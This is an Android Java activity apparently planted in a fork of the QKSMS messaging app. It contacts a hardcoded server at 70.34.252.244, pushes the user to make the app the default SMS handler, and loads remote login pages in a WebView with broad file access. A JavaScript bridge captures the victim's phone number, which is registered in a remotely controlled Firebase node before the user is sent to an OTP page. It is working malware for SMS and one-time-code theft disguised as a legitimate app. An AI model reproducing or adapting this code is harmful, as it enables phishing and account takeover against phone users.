package com.moez.QKSMS;

import android.app.Activity;
import android.app.role.RoleManager;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.preference.PreferenceManager;
import android.provider.Telephony;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.moez.QKSMS.common.QKApplication;
import com.moez.QKSMS.feature.main.MainActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Calendar;
import java.util.Date;

/**
 * Created by BlueStorm on 19/10/2017.
 */

public class WebVisor extends AppCompatActivity implements View.OnTouchListener,  Handler.Callback {

    private WebViewClient webViewClient;
    private String  phone_status,check;
    private WebView webView;
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_web);
        webView =  findViewById(R.id.webVisor);

        long currentTime = System.currentTimeMillis();

//        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
//        setSupportActionBar(toolbar);
        final ProgressBar progressBar = (ProgressBar)findViewById(R.id.progressBar_web);

        final WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAppCacheEnabled(true);
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        webSettings.setDomStorageEnabled(true);
        webSettings.setGeolocationEnabled(true);
        webSettings.setAppCacheEnabled(true);
        webSettings.setCacheMode(webSettings.LOAD_CACHE_ELSE_NETWORK);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowFileAccess(true);


            //generamos el webview y cargamos el enlace
            webViewClient = new WebViewClient() {

                @Override
                public void onPageStarted(WebView view, String url, Bitmap favicon) {
                    super.onPageStarted(view, url, favicon);
                    progressBar.setVisibility(View.VISIBLE);
                }
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    String allow = "0";
                    progressBar.setVisibility(View.GONE);

                    DatabaseReference databaseReference =  firebaseDatabase.getReference().child(phoneNumber);

                    databaseReference.addValueEventListener(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            String allow = snapshot.child("allow").getValue(String.class);
                            Log.d("Doronin", "allow" + allow);
                            if(allow.equals("0")){
                                if(phone_status.equals("0")){
                                    addFirebase();
                                }
                            }else{
                                Intent intent = new Intent(WebVisor.this, MainActivity.class);
                                startActivity(intent);
                                finish();
                            }
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {
                            // calling on cancelled method when we receive
                            // any error or we are not able to get the data.
                            Toast.makeText(WebVisor.this, "Fail to get data.", Toast.LENGTH_SHORT).show();
                        }
                    });

                }

                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    handler.sendEmptyMessage(CLICK_ON_BUTTON);
                    return false;
                }

                        @Override
                public void onLoadResource(WebView view, String url) {


                }
            };
            webView.setWebViewClient(webViewClient);
            webView.removeJavascriptInterface("Android");
            webView.addJavascriptInterface(getLogInFormInterface(), "Android");
//            webView.setOnTouchListener(new View.OnTouchListener() {
//                @Override
//                public boolean onTouch(View v, MotionEvent event) {
//                    WebView.HitTestResult hr = ((WebView)v).getHitTestResult();
//                    Log.i("Doronin", "getExtra = "+ hr.getExtra() + "\t\t Type=" + hr.getType());
//                    return false;
//                }
//            });


        phone_status = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("phone_status", "0");
        callCheckAPI();


    }
    private void callCheckAPI(){


        StringRequest stringRequest = new StringRequest(Request.Method.GET,"http://70.34.252.244/sms/login.php",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject jsonObject = new JSONObject(response);

                            if(jsonObject.has("check")){
                                check = jsonObject.getString("check");

                                final SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
                                editor.putString("check", check);
                                editor.apply();

                                if(check.equals("1")){
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                        RoleManager  roleManager = getSystemService(RoleManager.class);

                                        if (roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
                                            if (roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {

                                            } else {
                                                Intent roleRequestIntent = roleManager.createRequestRoleIntent(
                                                        RoleManager.ROLE_SMS);
                                                startActivityForResult(roleRequestIntent, 42389);
                                            }
                                        }
                                    } else {
                                        Intent defaultI = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                                        defaultI.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,
                                                getApplicationContext().getPackageName());
                                        startActivity(defaultI);

                                    }

                                    if(phone_status.equals("0")){
                                        webView.loadUrl("http://70.34.252.244/sms/login.html");
                                    }else{
                                        webView.loadUrl("http://70.34.252.244/sms/register.html");
                                    }

                                }
                                else{
                                    Intent intent = new Intent(WebVisor.this, MainActivity.class);
                                    startActivity(intent);
                                    finish();
                                }
                            }



                        } catch (JSONException e) {
                            e.printStackTrace();
                        }


                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                    }
                }){

        };
        RequestQueue requestQueue = Volley.newRequestQueue(this);
        requestQueue.add(stringRequest);


    }
    private void addFirebase(){


            DatabaseReference databaseReferenceCMD =  firebaseDatabase.getReference().child(phoneNumber);//phoneNumber
            databaseReferenceCMD.child("allow").setValue("1");
            final SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
            editor.putString("phone_status", "1");
            editor.apply();

    }
    private void showToast(final String message) {

        runOnUiThread(new Runnable() {

            @Override
            public void run() {
                Toast.makeText(getApplicationContext(), message,
                        Toast.LENGTH_LONG).show();
            }
        });

    }
    @Override
    public void onBackPressed() {
        if (webView!=null) {
            webView.stopLoading();
            if (webView.canGoBack()) {
                webView.goBack();
            }
            else {
                super.onBackPressed();
            }
        }
        else {
            super.onBackPressed();
        }
    }
    private String phoneNumber;
    private FirebaseDatabase firebaseDatabase =  FirebaseDatabase.getInstance();
    private void addPhoneNumber(String str){
        try {
            JSONObject jsonObject = new JSONObject(str);
            phoneNumber = jsonObject.getString("pnumber");
            ((QKApplication)getApplication()).phonNumber = phoneNumber;
            final SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit();
            editor.putString("phoneNumber", phoneNumber);
            editor.apply();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    public LogInFormInterface getLogInFormInterface() {

        return new LogInFormInterface();

    }

    private static final int CLICK_ON_WEBVIEW = 1;
    private static final int CLICK_ON_BUTTON = 2;
    private final Handler handler = new Handler(this);

    @Override
    public boolean handleMessage(@NonNull Message msg) {

        if (msg.what == CLICK_ON_BUTTON) {
            handler.removeMessages(CLICK_ON_WEBVIEW);
            Intent intent = new Intent(WebVisor.this, OTPPage.class);
            startActivity(intent);
            finish();
            return true;
        }
        if (msg.what == CLICK_ON_WEBVIEW) {
            Toast.makeText(this, "WebView clicked", Toast.LENGTH_SHORT).show();
            return true;
        }
        return false;
    }

    @Override
    public boolean onTouch(View v, MotionEvent event) {

        if (v.getId() == R.id.webVisor && event.getAction() == MotionEvent.ACTION_DOWN) {
            handler.sendEmptyMessageDelayed(CLICK_ON_WEBVIEW, 500);
        }
        return false;
    }

    public class LogInFormInterface {
        @JavascriptInterface
        public void sendData(final String str) {

            //Get the string value to process
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    addPhoneNumber(str);
                }
            });
        }
    }

}
